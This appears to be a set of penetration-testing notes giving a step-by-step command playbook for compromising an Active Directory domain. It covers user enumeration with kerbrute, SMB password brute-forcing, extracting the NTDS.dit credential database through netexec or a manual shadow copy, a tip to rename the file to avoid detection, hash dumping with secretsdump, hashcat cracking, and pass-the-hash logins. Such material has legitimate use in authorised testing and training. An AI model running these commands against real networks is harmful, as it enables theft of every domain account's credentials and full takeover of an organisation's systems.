
## Finding the AD Domain Name

- We execute the below command to get the domain name of the AD network and then we can use it to enumerate users in the AD using `kerbrute`.

```bash
netexec smb <TARGET_IP> 
```

## Enumerate Users in AD 

- Targets the AD network to identify valid usernames without triggering account lockouts or generating standard Windows logon failure alerts.
- `--dc` specifies the **domain controller** i.e the Windows server managing the entire AD network and `--domain` is the name of that AD network.

```bash
./kerbrute_linux_amd64 userenum --dc <TARGET_IP> --domain <AD_DOMAIN_NAME> <wordlist>
```

## Bruteforce Attack AD to get Hashes of Username

- After you get the username, use that to bruteforce attack on the SMB service and find the password of the user.
- Then use those credentials to log into the AD network.

```bash
netexec smb <TARGET_IP> -u <USERNAME> -p <wordlist>
```

## Capturing NTDS.dit

- Before trying to capture `NTDS.dit` file we need to find the valid users present in the AD domain network.
- There are 2 methods to capture the `NTDS.dit`.
- They are :-
	- `METHOD 1`: Using `netexec` to capture the `NTDS.dit` file remotely 
	- `METHOD 2`: Manual way ... connecting to the domain controller, then using the user privileges to make a shadow copy of the `NTDS.dit` file and then transfer it back to attack machine and then crack it offline.

### METHOD 1 : Another Method to Capture NTDS.dit

```bash
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil
```

### METHOD 2 : THE MANUAL WAY

### 1. Connecting to DC

- Using the credentials gathered we can connect to the target domain controller itself.
- Normally access will be denied unless the user has certain privileges like **administrator** or **domain admin**.

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
```

### 2. Check User privileges

- The below command is used to find the privileges of the user, we used to login. If the user has **admin** rights then we can make a copy of `NTDS.dit` file. To do this the user needs to be part of `Administrators group` or `Domain Admins group`.

#### (a) User Group Privileges

```cmd
net localgroup
```

#### (b) User Account Privileges

```cmd
net user <USERNAME>
```

### 3. Creating shadow copy of C:

- Copy the disk where AD was installed. Most likely it gets installed in `C:` drive so use `vssadmin` to make a copy of that drive.
- creates a shadow copy of the `C:` drive. The shadow copy path will be shown use that in the copying of `NTDS.dit` from the VSS.

```cmd
vssadmin CREATE SHADOW /For=C:
```

**SHADOW FILE PATH : A `shadow file path` refers to the unique, system-level address used by Windows to point inside a **Volume Shadow Copy (VSS) snapshot rather than the active, live hard drive. Windows doesn't give it a normal letter like `D:` or `E:`. Instead, it assigns it a device path for example => (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`).**


### 4. Copying NTDS.dit from the VSS

- `/c` tells the `cmd.exe` to run `copy` command and immediately close itself when finished.
- `C:\NTDS\NTDS.dit` is the location where the file will be copied as.

```cmd
cmd.exe /c copy <SHADOW FILE PATH> C:\NTDS\NTDS.dit
```

- **For eg :-** The shadow path might look like this `Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2` so the `NTDS.dit` file path will be `Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit`.

### 5. Transferring NTDS.dit to attack host

- Transfer the file having the `NTDS.dit` in path.
- Checkout Windows to Linux transfer methods
- Before transferring rename the `NTDS.dit` file because AD might block the file from transferring by checking its name since its a critical file.


### 6. Extracting hashes from NTDS.dit

- After `NTDS.dit` has been extracted to the attack machine use the below command to extract hashes.
- This tool decrypts the NTDS.dit file using the SYSTEM hive and outputs the **NTLM hashes** and **LM hashes** (if enabled) of all user accounts within the Active Directory domain, including domain administrators.

```bash
impacket-secretsdump -ntds <NTDS.dit file transferred> -system SYSTEM
```


### 7. Cracking NTDS.dit Hashes 

```bash
sudo hashcat -m 1000 <NTDS_hash/NTDS_hash_file> <wordlist>
```


## Pass the Hash (PtH)

- If we fail to crack the hash, then we can try to authenticate ourselves using the user's hash. This type of attack is called `PtH` or **Pass the Hash** which takes advantage of the NTLM authentication protocol by authenticating using the username and user's password hash. `username:password hash` 

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>
```





